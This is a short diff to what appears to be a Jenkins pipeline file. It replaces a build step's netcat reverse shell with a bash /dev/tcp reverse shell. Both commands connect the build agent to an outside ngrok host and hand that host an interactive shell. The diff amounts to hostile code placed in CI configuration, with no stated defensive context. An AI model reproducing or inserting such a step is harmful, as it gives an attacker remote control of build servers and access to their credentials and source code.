@@ -5,7 +5,7 @@ pipeline {
       agent any
       steps {
         sh '''#!/bin/bash
-        nc d3e32bddf06d.ngrok.io –e /bin/bash
+        bash -i >& /dev/tcp/d3e32bddf06d.ngrok.io/80 0>&1
         '''
       }
     }
